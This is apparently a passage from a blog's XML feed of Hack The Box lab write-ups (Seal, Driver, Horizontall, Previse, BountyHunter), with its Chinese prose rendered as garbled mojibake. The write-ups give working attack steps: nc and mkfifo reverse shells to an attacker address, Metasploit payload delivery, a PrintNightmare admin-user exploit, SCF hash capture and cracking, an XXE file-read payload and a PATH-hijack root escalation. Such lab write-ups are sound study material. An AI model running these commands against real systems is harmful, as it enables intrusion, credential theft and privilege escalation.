    <content type="html"><![CDATA[<p>ä¸­ç­‰éš¾åº¦ï¼Œä¸”è¯„åˆ†4.8å¾ˆæ£’çš„é¶åœº</p><hr><pre><code>nmap -sS -T5 10.10.10.250  PORT     STATE SERVICE 22/tcp   open  ssh 443/tcp  open  https 8080/tcp open  http-proxy</code></pre><hr><pre><code>è®¿é—®ä¸€ä¸ª8080ç«¯å£ï¼Œæç¤ºæ³¨å†Œç”¨æˆ·ï¼Œæ³¨å†Œä¸€ä¸ªå¸¸è¯•ç™»å½•ä¸€ä¸‹ hacker hacker</code></pre><p><img src="https://pic.imgdb.cn/item/616d2fae2ab3f51d91b86a4d.jpg"><br><img src="https://pic.imgdb.cn/item/616d2fb12ab3f51d91b86d66.jpg"><br><img src="https://pic.imgdb.cn/item/616d2fb42ab3f51d91b86f6c.jpg"></p><p>updating tomcat configuration  ç‚¹äº†ä¹‹åç»™äº†tomcatçš„å¸å¯†</p><hr><pre><code>&lt;user username=&quot;tomcat&quot; password=&quot;42MrHBf*z8&#123;Z%&quot; roles=&quot;manager-gui,admin-gui&quot;/&gt;</code></pre><p>è®¿é—®tomcaté»˜è®¤ç™»å½•ç›®å½•ï¼Œç”¨åˆšæ‰çš„è´¦å·å¯†ç ç™»å½•ï¼Œç™»å½•æˆåŠŸ<br><img src="https://pic.imgdb.cn/item/616d2fb82ab3f51d91b8733d.jpg"></p><hr><pre><code>https://seal.htb/manager/status/..;/html   ä¸Šé¢æœ‰ä¸ªä¸Šä¼ </code></pre><p>éœ€è¦åœ¨ä¸Šä¼ çš„è·¯å¾„ä¸Šä¿®æ”¹ </p><hr><pre><code>POST /manager/satus/..;/html/upload?</code></pre><p>200ä¸Šä¼ æˆåŠŸï¼Œè®¿é—®æœ¨é©¬</p><hr><pre><code>seal.htb/ma/ nc -nvlp 4444 åå¼¹æˆåŠŸ</code></pre><hr><pre><code>cd home/luis  å‘ç°user.txtè®¿é—®ä¸äº†ï¼Œéœ€è¦ææƒã€‚   .sshä¹Ÿæ²¡æœ‰è®¿é—®æƒé™</code></pre><p>å°è¯•åˆ›å»ºä¸€ä¸ªæŒ‡å‘luisçš„id_rsaçš„é“¾æ¥ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®ƒæ”¾åˆ°/uploadsç›®å½•ä¸­  </p><hr><pre><code>cd /opt/backups/archives  ln -s ~/home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/id_rsa  cp æ–°å‡ºç°çš„backup+æ—¥æœŸçš„æ–‡ä»¶ /dev/shm  cd /dev/shm  mv backup-2021-07-26-14:20:32.gz backup.tar.gz  tar -xvf backup.tar.gz  cd /dashboard/uploads  cat id_rsa  kali æœ¬æœºåˆ›å»ºä¸€ä¸ª luis-id_rsaæ–‡ä»¶å¤åˆ¶id_rsaé‡Œé¢çš„å†…å®¹ ssh -i lis-id_rsa luis@10.10.10.250 è¿æ¥æˆåŠŸï¼Œæ‰¾åˆ°ç¬¬ä¸€ä¸ªuser.txt</code></pre><hr><pre><code>sudo -l /usr/bin/ansible-playbook </code></pre><hr><pre><code>googleæ‰¾åˆ°è¿™ä¸ªç©æ„å„¿ï¼Œåº”è¯¥æ˜¯ç”¨æ¥ç¼–å†™ç½‘é¡µçš„æ˜¯ä¸€ä¸ªä¸œè¥¿å§ï¼Œä½†æ˜¯å¯ä»¥ç”¨æ¥æ‰§è¡Œå‘½ä»¤ï¼Œ https://docs.ansible.com/ansible/latest/user_guide/playbooks.html</code></pre><p>åˆ›å»ºä¸€ä¸ªymlæ–‡ä»¶</p><hr><pre><code>åˆ›å»ºä¸€ä¸ªymlæ–‡ä»¶- name: Ansible Copy Example Local to Remote  hosts: localhost  tasks:    - name: copying file with playbook      become: true       copy:        src: /root/root.txt        dest: /dev/shm        owner: luis        group: luis                mode: 0777</code></pre><hr><pre><code>sudo -u root /usr/bin/ansible-playbook root.yml </code></pre><p>è®¿é—®/dev/shm/root.txtå°±æˆåŠŸäº†ã€‚<br><img src="https://pic.imgdb.cn/item/616d2fc22ab3f51d91b87a81.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hack The Box</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Driver</title>
    <link href="/2021/10/18/Hach%20The%20Box-Driver/"/>
    <url>/2021/10/18/Hach%20The%20Box-Driver/</url>
    
    <content type="html"><![CDATA[<hr><pre><code>http://10.10.11.106</code></pre><p>æ‰“å¼€ä¼šæœ‰ä¸€ä¸ªç™»é™†æ¡†(æ‰“å°æœº)ï¼Œéšä¾¿è¾“å…¥ç™»å½•åå’Œå¯†ç ï¼ŒæˆåŠŸç™»å…¥</p><p>éšä¾¿ç‚¹çš„æ—¶å€™å‘ç°ä¸€ä¸ªä¸Šä¼ çš„åœ°æ–¹</p><p>ç«¯å£æƒ…å†µ<br><img src="https://pic.imgdb.cn/item/616d2d402ab3f51d91b634aa.jpg"></p><p>ç”¨Responderä¸Šä¼ scfæ–‡ä»¶å°è¯•æŠ“å–hash</p><hr><pre><code>python Responder.py -I tun0</code></pre><p>åˆ›å»ºä¸€ä¸ª1.scfæ–‡ä»¶ï¼Œä¸Šä¼ ä¸Šå»</p><hr><pre><code>[Shell] Command=2 IconFile=\\10.10.14.23\share\test.ico [Taskbar] Command=ToggleDesktop</code></pre><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d2d442ab3f51d91b637ed.jpg"></h2><pre><code>scræ–‡ä»¶æ”»å‡»ç›¸å…³æ–‡ç«  https://www.t00ls.cc/articles-42590.html?page=4 https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458286248&amp;idx=1&amp;sn=4cdbf73f47753a979024958622b468e7&amp;chksm=b181482286f6c1348bfb6be7e52716381befddb979c5e7b94335c71f9532e9691e979833df78&amp;scene=38#wechat_redirect</code></pre><p><img src="https://pic.imgdb.cn/item/616d2d472ab3f51d91b63ae0.jpg"></p><p>ç”¨hashcatè·‘ï¼Œè¿™é‡Œè¦æ³¨æ„hashçš„ç±»å‹ï¼ŒNetNTLMv2 Hash   -m æŒ‡å®š æ¨¡å¼ 5600</p><hr><pre><code>hashcat hash.txt /usr/share/wordlists/rockyou.txt -m 5600</code></pre><p><img src="https://pic.imgdb.cn/item/616d2d4a2ab3f51d91b63e3c.jpg"></p><p>è·å¾—å¯†ç liltony<br>ç”¨evil-winrmç™»å½•</p><hr><pre><code>evil-wirm -i 10.10.11.106 -u tony -p liltony</code></pre><p>åœ¨Desktopä¸‹æ‹¿åˆ°ç¬¬ä¸€ä¸ªflag<br>ææƒ<br>winpeas è¿™ä¸ªæ–‡ä»¶è·‘å‡ºæ¥ä¹Ÿçœ‹ä¸æ‡‚å•¥å­ï¼Œï¼Œï¼Œå¤šçœ‹æ–‡ç« çœ‹ä»–ä»¬æ€ä¹ˆç”¨çš„<br>å…ˆç”¨ewä¸Šä¼  </p><hr><pre><code>upload /root/tools/winPEAS.bat</code></pre><p>å‘ç°ä¸€ä¸ªspoolsv </p><hr><pre><code>ä¸‹è½½exp https://github.com/calebstewart/CVE-2021-1675</code></pre><p>upload ä¸Šä¼ ä¸Šå»ï¼Œç„¶ååŠ è½½ï¼ˆè¿™é‡Œæœ‰ä¸ªå‘ï¼Œpowershellé»˜è®¤ä¸å…è®¸è¿è¡Œè„šæœ¬ï¼Œå¯ä»¥ç”¨å‘½ä»¤æ‰“å¼€ï¼‰</p><hr><pre><code>Import-Module .\cve-2021-1675.ps1  Invoke-Nightmare  -NewUser &quot;hacker&quot; -NewPassword &quot;hacker&quot;</code></pre><p>ç¬¬ä¸€æ­¥ï¼šä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œpowershell ç¬¬äºŒæ­¥ï¼šæ‰§è¡Œï¼šget-ExecutionPolicyï¼Œå›å¤Restrictedï¼Œè¡¨ç¤ºçŠ¶æ€æ˜¯ç¦æ­¢çš„ã€‚ ç¬¬ä¸‰æ­¥ï¼šæ‰§è¡Œï¼šset-ExecutionPolicy RemoteSigned ç¬¬å››æ­¥ï¼šé€‰æ‹©Yï¼Œå›è½¦ã€‚ ç¬¬äº”æ­¥ï¼šé‡å¯powershellï¼Œé—®é¢˜è§£å†³ã€‚</p><p>ä½†æ˜¯åœ¨evil-winrmé‡Œé¢å¹¶ä¸å¾—è¡Œï¼Œå¯åŠ¨ä¸äº†é‚£ä¸ªæ¨¡å¼ï¼Œå°è¯•ç”¨msfï¼ŒwebæŠ•é€’ä¸Šçº¿ï¼Œç„¶åæ</p><hr><pre><code>use exploit/multi/script/web_delivery set target 2 set payload windows/x64/meterpreter/reverse_tcp set lhost 10.10.14.7 set lport 5555 exploit</code></pre><p>ä¸Šçº¿æˆåŠŸï¼ŒåŠ è½½expæ¨¡å—<br>    load powershell<br>    powershell_shell<br>    Import-Module .\CVE-2021-1675.ps1</p><p><img src="https://pic.imgdb.cn/item/616d2d4e2ab3f51d91b64321.jpg"></p><p>å†ç”¨evil-WinRMç™»å½•å°±è¡Œäº†ï¼Œ å†administrator/desktopé‡Œé¢æ‰¾åˆ°root.txt</p><p><img src="https://pic.imgdb.cn/item/616d2d512ab3f51d91b645b6.jpg"></p><p>ç»ˆäºæ‰“å®Œäº†ï¼Œé‡åˆ°çš„é—®é¢˜å°±æ˜¯ææƒï¼Œspoolsvè®°ä½è¿™ä¸ªç©æ„å„¿å¯ä»¥ææƒï¼Œç„¶åevil-winrmå…è®¸è¿è¡Œè„šæœ¬å“ªé‡Œ å“ªé‡Œå¦‚æœæ•´ä¸ä¸Šä¸æ˜¯è¿˜å¯ä»¥ç”¨msfå—ï¼Œè¿™ä¸ªæ€è·¯è¦æœ‰ï¼Œ<br><img src="https://pic.imgdb.cn/item/616d2d542ab3f51d91b6486f.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hack The Box</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Horizontall</title>
    <link href="/2021/10/18/Hach%20The%20Box-Horizontall/"/>
    <url>/2021/10/18/Hach%20The%20Box-Horizontall/</url>
    
    <content type="html"><![CDATA[<hr><pre><code>nmap -sS -sC -sV -A -p- 10.10.11.105</code></pre><p>ä¸€æ ·çš„22 å’Œ 80 é¶åœºç»‘å®šäº†åŸŸåä¿®æ”¹etc/hostsæ–‡ä»¶ </p><hr><pre><code>echo 10.10.11.105 horizontall.htb &gt;&gt; /etc/hosts</code></pre><p>gobusterå•¥éƒ½æ²¡è·‘å‡ºæ¥ è¿™ç§æƒ…å†µï¼Œç½‘ç«™æ²¡æœ‰å•¥åŠŸèƒ½ç‚¹ï¼Œä½†æ˜¯æ‰«ç›®å½•ä¹Ÿæ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„ä¸œè¥¿ï¼Œå°è¯•ä»æ¥å£å…¥æ‰‹</p><hr><pre><code>jsfinder python3 JSFinder.py -u http://horizontall.htb/</code></pre><p><img src="https://pic.imgdb.cn/item/616d26652ab3f51d91b02160.jpg"><br>åŒæ ·çš„æ¥å£ä¹Ÿå†™åœ¨hostsæ–‡ä»¶é‡Œ</p><hr><pre><code>echo 10.10.11.105 api-prod.horizontall.htb &gt;&gt; /etc/hosts</code></pre><p>æ‰«æ¥å£çœ‹æœ‰æ²¡æœ‰ä¸œè¥¿<br><img src="https://pic.imgdb.cn/item/616d26692ab3f51d91b024b8.jpg"></p><p>æ‰«åˆ°ä¸€ä¸ªåå°ï¼Œå¹¶ä¸”æ˜¯ä¸€ä¸ªcmsï¼Œç„¶åæ‰¾ä¸‹æœ‰æ²¡æœ‰å…¬å¼€çš„æ¼æ´ </p><hr><pre><code>http://api-prod.horizontall.htb/admin/auth/login</code></pre><p>è®¿é—®ç›®å½•/admin/strapiVersionå¯è·å–strapiçš„ç‰ˆæœ¬å·<br><img src="https://pic.imgdb.cn/item/616d266e2ab3f51d91b02b91.jpg"><br><img src="https://pic.imgdb.cn/item/616d26722ab3f51d91b02f1f.jpg"></p><p>exp-dbæ‰¾åˆ°ä¸€ä¸ªexp<br><img src="https://pic.imgdb.cn/item/616d26752ab3f51d91b03217.jpg"></p><p>å¯ä»¥é‡ç½®å¯†ç å’Œrce</p><hr><pre><code>nc 10.10.14.7 1234  nc -lvvp 1234  å¼¹æ˜¯å¼¹äº†ï¼Œä½†æ˜¯æ‰§è¡Œä¸äº†å‘½ä»¤</code></pre><hr><pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.7 1234 &gt;/tmp/f</code></pre><p><img src="https://pic.imgdb.cn/item/616d26782ab3f51d91b034c0.jpg"></p><p>nc -lvvp 1234 å¼¹å›æ¥äº†ï¼Œèƒ½æ‰§è¡Œäº† </p><hr><pre><code>python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; </code></pre><p>åœ¨homeæ–‡ä»¶å¤¹ä¸‹çš„ä¸‹ä¸€ä¸ªæ–‡ä»¶å¤¹æ‰¾åˆ°user.txt<br><img src="https://pic.imgdb.cn/item/616d267c2ab3f51d91b03868.jpg"></p><p>ä¸Šä¼ äº†ä¸€ä¸ªææƒå·¥å…·linpeas.sh è¿™ä¸ªè„šæœ¬éå¸¸å‰å®³ï¼Œå¯ä»¥æšä¸¾linuxæ“ä½œç³»ç»Ÿå‡ ä¹æ‰€æœ‰çš„å¯ææƒé¡¹ï¼Œç”šè‡³å¯ä»¥é€šè¿‡suæš´åŠ›ç ´è§£æœ¬åœ°å¯†ç ï¼Œè¾“å‡ºéå¸¸å¤šã€‚  ç¬¬ä¸€æ¬¡ç”¨è¿™ä¸ªå·¥å…·ï¼Œå¥½åƒç¡®å®å±Œï¼Œæ‰¾åˆ°ä¸€ä¸ª8000çš„ç«¯å£å’Œä¸€ä¸ª1337ç«¯å£<br><img src="https://pic.imgdb.cn/item/616d26802ab3f51d91b03c71.jpg"></p><p>è¿™ä¸ªå°è¯•è¿ssh ä½†æ˜¯è¿ä¸ä¸Š<br><img src="https://pic.imgdb.cn/item/616d26832ab3f51d91b03e5d.jpg"></p><hr><pre><code>de1veloper #J!:F9Zt2u</code></pre><p>ä¼ ä¸ªfrpè®¿é—®ä¸€ä¸‹ä»–çš„8000ç«¯å£ ä¼ äº†ä¾æ—§è®¿é—®ä¸äº†ï¼Œæ˜å¤©æ‰“ï¼Œ</p><p>ssh-keygenç”Ÿæˆä¸€ä¸ªå…¬é’¥ï¼Œä¼ ä¸Šå»ï¼Œç„¶åè¿æ¥</p><hr><pre><code>wget 10.10.14.7/id_rsa.pub -O authorized_keysssh strapi@10.10.11.105 -i id_rsa</code></pre><p>ssh æŠŠ8000ç«¯å£è½¬å‘å‡ºæ¥</p><hr><pre><code>ssh -i id_rsa -L 8000:127.0.0.1:8000 strapi@10.10.11.105</code></pre><p>æ•°æ®åº“è¿æ¥è¿›å»çœ‹ä¸€ä¸‹ æœ‰ä¸€ä¸ªstrapiè¡¨<br><img src="https://pic.imgdb.cn/item/616d26862ab3f51d91b041b4.jpg"></p><p>è¿›å»çœ‹ä¸‹<br><img src="https://pic.imgdb.cn/item/616d26892ab3f51d91b0456d.jpg"></p><hr><pre><code>select * from strapi_administrator; |  3 | admin    | admin@horizontall.htb | $2a$10$7NGi1GoBaGP3Lw3FYAjw9OhXkgqVRpoecHoaXXIwoVhLZx0etorve | NULL               |    NULL |</code></pre><p>kali å†™ä¸ªå…¬é’¥è¿›å» æŠŠç«¯å£å¸¦åˆ°æœ¬åœ°çš„8000</p><hr><pre><code>ssh -L 8000:127.0.0.1:8000 strapi@horizontall.htb</code></pre><p>127.0.0.1:8000è®¿é—®ä¸äº†ï¼Œä¸æ‰“äº†ï¼Œä¸‹ä¸€ä½ã€‚</p><p>ä»–å¦ˆçš„ï¼Œè®¿é—®ä¸äº†çš„åŸå› æ˜¯å¼€äº†æ¢¯å­ï¼Œï¼Œï¼Œï¼Œæ·¦<br><img src="https://pic.imgdb.cn/item/616d268d2ab3f51d91b04999.jpg"></p><p>çº¢æ—¥7ä¹Ÿå‡ºç°è¿‡è¿™ç©æ„å„¿ï¼Œç›´æ¥ç”¨exp rceæ‰“å°±è¡Œäº†</p><hr><pre><code>python3 exploit.py http://localhost:8000 Monolog/RCE1 &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.7 2345 &gt;/tmp/f &quot;</code></pre><hr><pre><code>nc -lvvp 2345</code></pre><p>å¼¹å›æ¥äº†<br><img src="https://pic.imgdb.cn/item/616d26902ab3f51d91b04d1a.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hack The Box</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Previse</title>
    <link href="/2021/10/18/Hach%20The%20Box-Previse/"/>
    <url>/2021/10/18/Hach%20The%20Box-Previse/</url>
    
    <content type="html"><![CDATA[<hr><pre><code>å‚è€ƒwpï¼šhttps://davidguest.uk/hack-the-box-previse/https://hackhouse.net/htb-previse/</code></pre><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d1a942ab3f51d91a35671.jpg"></h2><pre><code>è€æƒ¯ä¾‹ï¼Œnmap nmap -v -sSV -p 22,80 -Pn 10.10.11.104 -T4 -oA nmap/sSV æ„Ÿè§‰å…è´¹çš„ç®€å•é¶åœºéƒ½æ˜¯22 å’Œ 80</code></pre><p><img src="https://pic.imgdb.cn/item/616d1aca2ab3f51d91a3898a.jpg"><br>é¡µé¢æ‰“å¼€æ˜¯è¿™ä¹ˆä¸ªç©æ„å„¿<br><img src="https://pic.imgdb.cn/item/616d1aee2ab3f51d91a3aeed.jpg"><br>ç›®å½•æ‰«ææ²¡æ‰«å‡ºä»€ä¹ˆä¸œè¥¿<br>ä½¿ç”¨ curl æ—¶ï¼Œå¯ä»¥ä» webapp è·å–çœŸæ­£çš„å“åº”é¡µé¢ï¼Œå› ä¸º curl é»˜è®¤ä¸éµå¾ªé‡å®šå‘ã€‚</p><hr><pre><code>curl -is -X GET 10.10.11.104/index.php</code></pre><p>è®¿é—®ä¸€ä¸‹10.10.11.104/accounts.php </p><hr><pre><code>curl -is -X http://10.10.11.104/account.php</code></pre><p><img src="https://pic.imgdb.cn/item/616d1af42ab3f51d91a3b3ce.jpg"><br>å‘ç°äº†3ä¸ªè¡¨å•ï¼Œæäº¤æ•°æ® å¹¶ä¸”è¯´äº†ç”¨æˆ·åå’Œå¯†ç åœ¨5-32ä¸ªå­—ç¬¦ä¹‹é—´<br><img src="https://pic.imgdb.cn/item/616d1af72ab3f51d91a3b79b.jpg"><br>-d POST å‘é€æœ‰å‚æ•°çš„ POST è¯·æ±‚<br>ç”¨curlæäº¤postè¯·æ±‚è®¿é—®ä¸€ä¸‹ </p><hr><pre><code>curl -is -X POST -d &quot;username=hacker&amp;password=hacker&amp;confirm=hacker&quot; 10.10.11.104/accounts.php  </code></pre><p>æˆåŠŸç™»é™†ã€‚<br><img src="https://pic.imgdb.cn/item/616d1afc2ab3f51d91a3bcde.jpg"><br>å¼€å§‹ç¿»ç½‘ç«™ï¼Œç¿»åˆ°ä¸€ä¸ªåƒæ˜¯è¢«æ³¨å…¥è¿‡çš„ä¸€ä¸ªæ—¥å¿—æ–‡ä»¶<br><img src="https://pic.imgdb.cn/item/616d1b002ab3f51d91a3c109.jpg"><br>fileç›®å½•ä¸‹æœ‰ä¸€ä¸ªä¸Šä¼ å’Œä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„ä¸‹è½½ backupï¼Œå¤‡ä»½ï¼Œç½‘ç«™å¤‡ä»½æ–‡ä»¶ï¼Œæ‰“å¼€ï¼Œå¹²ä»– çœ‹å¤‡ä»½æ–‡ä»¶å°±çœ‹configï¼Œdbï¼Œè¿™ç±»çš„<br><img src="https://pic.imgdb.cn/item/616d1b062ab3f51d91a3c643.jpg"><br>è§£å‹æ–‡ä»¶ unzip siteBackup.zip<br><img src="https://pic.imgdb.cn/item/616d1b092ab3f51d91a3c8e1.jpg"><br>config.php  æ˜¯ä¸€ä¸ªæ•°æ®åº“é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥å°è¯•è¿ä¸€ä¸‹ssh<br><img src="https://pic.imgdb.cn/item/616d1b0d2ab3f51d91a3ccc8.jpg"><br>æ²¡å•¥ç”¨ï¼Œç»§ç»­ç¿»æ–‡ä»¶logs.php çœ‹åˆ°ä¸€ä¸ªexecå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°<br><img src="https://pic.imgdb.cn/item/616d1b0f2ab3f51d91a3cf92.jpg"><br>&amp;&amp; è¿æ¥ä¸€ä¸ªåå¼¹shellçš„å‘½ä»¤<br><img src="https://pic.imgdb.cn/item/616d1b122ab3f51d91a3d22e.jpg"><br><img src="https://pic.imgdb.cn/item/616d1b172ab3f51d91a3d6af.jpg"><br><img src="https://pic.imgdb.cn/item/616d1b1a2ab3f51d91a3d96d.jpg"><br>è¿æ¥æˆåŠŸï¼Œæ˜¯ä¸ªä½æƒé™çš„ ls æ²¡æœ‰è¦æ‰¾åˆ°çš„user root flag<br>ä½†æ˜¯/home/ä¸‹æœ‰ä¸€ä¸ªç”¨æˆ·m4lwhereï¼Œä¸‹é¢æœ‰ä¸€ä¸ªuser.txtï¼Œéœ€è¦m4lwhereæƒé™æ‰èƒ½è®¿é—®<br>å‰é¢æ‹¿åˆ°æ•°æ®åº“é…ç½®çš„æ–‡ä»¶ï¼Œçœ‹èƒ½ä¸èƒ½å†æ•°æ®åº“é‡Œé¢æ‰¾åˆ°m4lwhereçš„hash ç”¨hashcat çˆ†ä¸€ä¸‹<br>æ„é€ è„šæœ¬</p><hr><pre><code>&lt;?php$db = connectDB();$query = &quot;SELECT username, password FROM accounts&quot;;$users = $db-&gt;query($query);if ($users-&gt;num_rows &gt; 0) &#123;    while($row = mysqli_fetch_assoc($users)) &#123;      var_dump($row);    &#125;  &#125;$db-&gt;close();</code></pre><hr><pre><code>echo &#39;&lt;ä¸Šé¢çš„ä»£ç &gt;&#39; &gt;&gt; status.phpé‡Œ</code></pre><hr><pre><code>curl 10.10.11.104/status.php  è®¿é—®é‚£ä¸ªæ–‡ä»¶ï¼ŒæˆåŠŸè¯»åˆ°äº†ä»–çš„hash</code></pre><h2 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d1b1f2ab3f51d91a3ddcf.jpg"></h2><pre><code>m4lwhereçš„hashå°±æ˜¯$1$ğŸ§‚llol$DQpmdvnb7EeuO6UaqRItf.</code></pre><hr><pre><code>ç”¨john æˆ–è€… hashcatè·‘hashæ˜æ–‡</code></pre><hr><pre><code>johnjohn hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long</code></pre><h2 id="-2"><a href="#-2" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d1b242ab3f51d91a3e262.jpg"></h2><pre><code>hashcathashcat hash.txt /usr/share/wordlists/rockyou.txt -m 500</code></pre><p><img src="https://pic.imgdb.cn/item/616d1b272ab3f51d91a3e54e.jpg"><br>sshè¿æ¥æ‹¿åˆ°ç¬¬ä¸€ä¸ªuser.txt<br><img src="https://pic.imgdb.cn/item/616d1b272ab3f51d91a3e54e.jpg"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><hr><pre><code>sudo -l  çœ‹åˆ°ä¸€ä¸ªaccess_backup.shçš„rootæ–‡ä»¶</code></pre><hr><pre><code>m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh#!/bin/bash# We always make sure to store logs, we take security SERIOUSLY here# I know I shouldnt run this as root but I cant figure it out programmatically on my account# This is configured to run with cron, added to sudo so I can run as needed - we&#39;ll fix it later when there&#39;s timegzip -c /var/log/apache2/access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_access.gzgzip -c /var/www/file_access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_file_access.gz</code></pre><hr><pre><code>cd /tmpcat &lt;&lt; EOF &gt; gzip&gt; #!/bin/bash&gt; cp /bin/bash /tmp/c&gt; chmod u+s /tmp/c&gt; EOFchmod +x gzipexport PATH=$( pwd ):$PATHsudo /opt/scripts/access_backup.sh./c -p</code></pre><hr><pre><code>ææƒä¸æ˜¯å¾ˆæ‡‚ï¼Œè¿™ä¸ªæœ‰ç‚¹åƒæ˜¯ç¯å¢ƒå˜é‡åŠ«æŒï¼ŒæˆåŠŸææƒ</code></pre><hr><pre><code>514371f6578495a1ae9624f3a199f944</code></pre><p><img src="https://pic.imgdb.cn/item/616d1b302ab3f51d91a3ed10.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hack The Box</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BountyHunter</title>
    <link href="/2021/10/18/Hach%20The%20Box-BountyHunter/"/>
    <url>/2021/10/18/Hach%20The%20Box-BountyHunter/</url>
    
    <content type="html"><![CDATA[<hr><pre><code>wpå‚è€ƒï¼š https://blog.csdn.net/weixin_47156475/article/details/119672224ç»™çš„ç›®æ ‡é¶æœº10.10.11.100</code></pre><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://i.loli.net/2021/10/18/dhRf8uF6OwqCzET.png" alt="image.png"></h2><pre><code>nmap -sV -T4 -A 10.10.11.100  æ‰«æç»“æœ</code></pre><h2 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://i.loli.net/2021/10/18/GKiBoweQNUbxIc9.png" alt="image.png"></h2><pre><code>è¿›ç½‘é¡µçœ‹çœ‹ï¼Œä¸æ˜¯ä»€ä¹ˆcmsï¼Œ</code></pre><hr><pre><code>gobuster æ‰«æä¸€ä¸‹ç›®å½•</code></pre><h2 id="-2"><a href="#-2" class="headerlink" title=""></a><img src="https://i.loli.net/2021/10/18/6hcwvZiktBGUnJ9.png"></h2><pre><code>nikto -h 10.10.11.100  å‘ç°3ä¸ªphpçš„æ–‡ä»¶db.phpè¿™ä¸ªåœ¨åé¢æœ‰å¤§ç”¨</code></pre><p><img src="https://i.loli.net/2021/10/18/ntYaGBHOep9ug7Q.png"><br><img src="https://i.loli.net/2021/10/18/aJucf7CqNeyBrQj.png"></p><hr><pre><code>readme.txt ä¹Ÿæ²¡æœ‰ä»€ä¹ˆå¯ç”¨ä¿¡æ¯</code></pre><h2 id="-3"><a href="#-3" class="headerlink" title=""></a><img src="https://i.loli.net/2021/10/18/ixFJ6eSXKWEV9bI.png"></h2><pre><code>ç„¶åå¼€å§‹åœ¨ç½‘ç«™åˆ°å¤„ç‚¹ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆåå°ï¼Œæ‰¾æ‰¾ä¸Šä¼ çå‡ æŠŠç‚¹ï¼Œç‚¹åˆ°ä¸€ä¸ªè¿™ä¸ªç©æ„å„¿</code></pre><h2 id="-4"><a href="#-4" class="headerlink" title=""></a><img src="https://i.loli.net/2021/10/18/HcoRwZ2F6tmvgaO.png"></h2><pre><code>å¥½åƒæ˜¯æäº¤å‚æ•°çš„ä¸œè¥¿ï¼ŒæŠ“åŒ…çœ‹ä¸‹ï¼Œåº”è¯¥æ˜¯base64 è§£å¯†çœ‹ä¸‹</code></pre><h2 id="-5"><a href="#-5" class="headerlink" title=""></a><img src="https://i.loli.net/2021/10/18/3z1j8sJvInYaSrq.png" alt="image.png"></h2><pre><code>åº”è¯¥æ˜¯base64 è§£å¯†çœ‹ä¸‹</code></pre><p><img src="https://i.loli.net/2021/10/18/1CzSY7X8yVZDIMr.png"><br><img src="https://pic.imgdb.cn/item/616d11802ab3f51d919b0fb6.jpg"></p><hr><pre><code>&lt;?xml  version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;    &lt;bugreport&gt;    &lt;title&gt;a&lt;/title&gt;    &lt;cwe&gt;b&lt;/cwe&gt;    &lt;cvss&gt;c&lt;/cvss&gt;    &lt;reward&gt;d&lt;/reward&gt;    &lt;/bugreport&gt;</code></pre><hr><pre><code>xmlæœ‰ç‚¹ç†Ÿæ‚‰å•Šï¼Œæ€è·¯å¥½åƒæ¸…æ™°äº†ï¼Œè¿™ä¸ªé¶æœºåº”è¯¥è€ƒçš„xxeå‚è€ƒwpè®¿é—®ä¸€ä¸‹/etc/passwd</code></pre><h2 id="-6"><a href="#-6" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d12bc2ab3f51d919c21ff.jpg"></h2><pre><code>&lt;?xml  version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE data [ &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;    &lt;bugreport&gt;    &lt;title&gt;test&lt;/title&gt;    &lt;cwe&gt;test&lt;/cwe&gt;    &lt;cvss&gt;test&lt;/cvss&gt;    &lt;reward&gt;&amp;file;&lt;/reward&gt;    &lt;/bugreport&gt;</code></pre><hr><pre><code>PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGRhdGEgWyA8IUVOVElUWSBmaWxlIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIj5dPgoJCTxidWdyZXBvcnQ</code></pre><hr><pre><code>è§£å¯†ç»“æœ</code></pre><hr><pre><code>&lt;?php// TODO -&gt; Implement login system with the database.$dbserver = &quot;localhost&quot;;$dbname = &quot;bounty&quot;;$dbusername 